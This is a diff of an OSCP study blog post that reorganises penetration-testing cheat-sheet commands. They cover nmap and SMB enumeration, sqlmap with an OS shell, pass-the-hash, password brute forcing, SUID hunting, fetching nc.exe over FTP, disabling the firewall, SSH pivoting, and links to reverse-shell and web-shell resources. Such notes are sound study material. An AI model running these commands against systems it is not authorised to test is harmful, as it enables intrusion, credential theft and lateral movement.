@@ -8,19 +8,10 @@ tags:
   - OSCP
 ---
 
-DIDNT SEND THIS TO WORK EMAIL
-http://infosectalk.com/my-oscp-notes/
+Here are some commands that I found helpful during the OSCP. I encourage you to take a look at the resource links that I've posted here to go in further detail in many of these topics.
 
-
-For buffer overflow article
-https://netsec.ws/?p=180
-
-
-http://hackingandsecurity.blogspot.com/2016/04/oscp-related-notes.html?m=1
-https://theslickgeek.com/oscp/
-
-
-Information Gathering / Enumeration
+# Pre  
+***
 
 Scanning
 General pass - nmap <IP> --top-ports 10 --open
@@ -49,14 +40,12 @@ smbclient -L \\<IP> -U "" -N
 rlogin <IP>
 nmblookup -A target
 
-
 SQL
 nmap -sV -Pn -vv –script=mysql* <IP> -p <PORT>
 sqlmap -u <IP> –crawl=1
 sqlmap -u http://<IP>/page.php?commen=761 –DBMS=mysql –os-shell
 http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet
 http://resources.infosecinstitute.com/backdoor-sql-injection/
-
 
 SMTP
 nmap –script=smtp* -p <PORT> <IP>
@@ -78,7 +67,11 @@ DNS
 nmap –script=dns-zone-transfer -p 53 ns2.megacorpone.com
 nmap <IP> -p- -sV --reason --dns-server 1.2.3.4
 
+Pass-the-Hash
+pth-winexe -U <HASH> //<IP> cmd
 
+# During  
+***
 
 Password Cracking
 (Discover type of hash that you have) hash-identifier
@@ -98,11 +91,6 @@ Medusa -h <IP> -U <USER FILE> -P <PASS FILE> -M http -m DIR:/admin -T 30
 
 Hashcat
 hashcat -m 400 -a 0 <HASH FILE> <WORD LIST>
-
-Packet Sniffing
-tcpdump -i tap0  host <IP> tcp port 80 and not arp and not icmp -vv
-tcpdump -i eth0 -w capture -n -U -s 0 src not <ATTACKING IP> and dst not <ATTACKING IP>
-tcpdump -vv -i eth0 src not <ATTACKING IP> and dst not <ATTACKING IP>
 
 TTY Shells
 See shells section
@@ -162,6 +150,40 @@ netsh firewall set opmode disable
 %WINDRIVE%\win.ini
 type %WINDRIVE%\System32\drivers\etc\hosts
 
+Useful Nix Commands
+SUID root files
+find / -user root -perm -4000 -print
+SGID root files:
+find / -group root -perm -2000 -print
+SUID & SGID files ownership
+find / -perm -4000 -o -perm -2000 -print
+Files not owned by anyone
+find / -nouser -print
+Files not owned by any group
+find / -nogroup -print
+Symlinks and their pointers
+find / -type l -ls
+
+
+Download an EXE from FTP server
+echo open IP> C:\script.txt
+echo user myftpuser>> C:\script.txt
+echo pass myftppass>> C:\script.txt
+echo get nc.exe>> C:\script.txt
+echo bye>> C:\script.txt
+ftp -s:script.txt
+
+Shells
+http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
+http://roo7break.co.uk/?p=215
+http://www.r57shell.net/
+
+
+
+
+# Post  
+***
+
 Windows looting (brief)
 systeminfo 
 type boot.ini 
@@ -197,31 +219,18 @@ arp -a
 tcpdump -i eth0 -w capture -n -U -s 0 src not <IP> and dst not <IP>
 tcpdump -vv -i eth0 src not <IP> and dst not <IP>
 
+SSH Pivoting
+ssh -D <IP>:1080 -p 22 user@IP
+Add socks4 <IP> 1080 in /etc/proxychains.conf
+proxychains commands target
 
-Download an EXE from FTP server
-echo open IP> C:\script.txt
-echo user myftpuser>> C:\script.txt
-echo pass myftppass>> C:\script.txt
-echo get nc.exe>> C:\script.txt
-echo bye>> C:\script.txt
-ftp -s:script.txt
+Packet Sniffing
+tcpdump -i tap0  host <IP> tcp port 80 and not arp and not icmp -vv
+tcpdump -i eth0 -w capture -n -U -s 0 src not <ATTACKING IP> and dst not <ATTACKING IP>
+tcpdump -vv -i eth0 src not <ATTACKING IP> and dst not <ATTACKING IP>
 
-Pass-the-Hash
-pth-winexe -U <HASH> //<IP> cmd
-
-Useful Nix Commands
-SUID root files
-find / -user root -perm -4000 -print
-SGID root files:
-find / -group root -perm -2000 -print
-SUID & SGID files ownership
-find / -perm -4000 -o -perm -2000 -print
-Files not owned by anyone
-find / -nouser -print
-Files not owned by any group
-find / -nogroup -print
-Symlinks and their pointers
-find / -type l -ls
+# Other  
+***
 
 Quick Kali Configuration
 SSH
@@ -256,12 +265,18 @@ cd /root/.wine/drive_c/MinGW/bin
 wine gcc -o exploit.exe /tmp/exploit.c -lwsock32
 wine exploit.exe
 
-SSH Pivoting
-ssh -D <IP>:1080 -p 22 user@IP
-Add socks4 <IP> 1080 in /etc/proxychains.conf
-proxychains commands target
 
-Shells
-http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
-http://roo7break.co.uk/?p=215
-http://www.r57shell.net/
+
+
+
+
+
+
+
+
+
+
+
+
+
+
